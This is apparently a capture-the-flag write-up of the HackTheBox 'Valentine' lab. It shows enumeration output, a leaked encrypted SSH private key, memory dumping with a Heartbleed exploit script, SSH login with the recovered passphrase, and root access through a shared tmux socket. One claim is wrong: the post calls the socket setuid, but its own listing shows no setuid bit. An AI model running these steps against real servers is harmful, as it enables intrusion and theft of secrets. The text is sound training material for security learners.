---
layout: post
title: HackTheBox - Valentine Writeup
tags: [hackthebox]
---

I thought this was a fun quick box. I remember when Heartbleed was all the craze, but I had never actually exploited it before Valentine. The box maker did a good job setting up extracting sensitive information out out memory via the vulnerability and giving us a nice simulation of how damaging the exploit could be.  


## Enumeration


```
root@kali:~/htb/valentine# nmap -sV 10.10.10.79

Starting Nmap 7.50 ( https://nmap.org ) at 2018-02-23 15:03 EST
Nmap scan report for 10.10.10.79
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
```
Since HTTPS is open let's run `sslscan`

```
root@kali:~/htb/valentine# sslscan 10.10.10.79
Version: 1.11.11-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 10.10.10.79

Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 vulnerable to heartbleed
TLS 1.1 vulnerable to heartbleed
TLS 1.0 vulnerable to heartbleed
~~~
~~~
```

The site is vulnerable to heartbleed (also hinted by the default graphic on the webserver landing page). We'll leverage this in a bit. 

While that was running `gobuster` was also running.

```
root@kali:~/htb/valentine# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.79/ -t 20

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/index (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/decode (Status: 200)
/omg (Status: 200)

```

We see we have a few hits. Let's check out `/dev`.

![dev](/img/valentine-dev.png)

![notes](/img/valentine-notes.png)

![key](/img/valentine-key.png)

The key here is in hexadecimal, so let's try to decode it.

```
root@kali:~/htb/valentine# cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

```

We see we have a private key, however we can see at the top of the key we have two headers: `Proc-Type` and `DEK-Info` which means we're going to need a passphrase for this key.

## Exploitation

Since we know the site is vulnerable to HeartBleed. Let's see what information we can grab from the server's memory. We can do this via a python script from [here](https://gist.github.com/eelsivart/10174134)

The python script allows us to connect multiple times with the `-n` option and dump the contents of memory over and over so we have a better chance of catching something. 

```
root@kali:~/htb/valentine# python heartbleed.py 10.10.10.79 -n 20

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 20 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 20 of 20
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#q.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==9.Z..Jo......)...G.Bq.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............

```

We see something hitting `decode.php`, which looks like base64. You can decode either via the `decode.php` page or just with the `base64 -d` command.

![decode](/img/valentine-decode.png)

`heartbleedbelievethehype` is most likely the passphrase on our sshkey. Since the key is named `hype_key` we can also assume that our username is `hype`.

```
root@kali:~/htb/valentine# ssh -i key hype@10.10.10.79
Enter passphrase for key 'key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 23 12:04:56 2018 from 10.10.14.5
hype@Valentine:~$

```

## Privilege Escalation

If we check out the bash history for hype we see something interesting.

```
hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit

```

We can see hype was attaching to a `tmux` socket.

```
hype@Valentine:/.devs$ ls -al
total 8
drwxr-xr-x  2 root hype 4096 Feb 23 13:19 .
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
srw-rw----  1 root hype    0 Feb 23 13:19 dev_sess
```

We can see that the setuid bit is set on `dev_sess` and is owned by root.

Let's attach to the socket.
```
hype@Valentine:/.devs$ tmux -S dev_sess 

root@Valentine:/.devs# 
```

And done!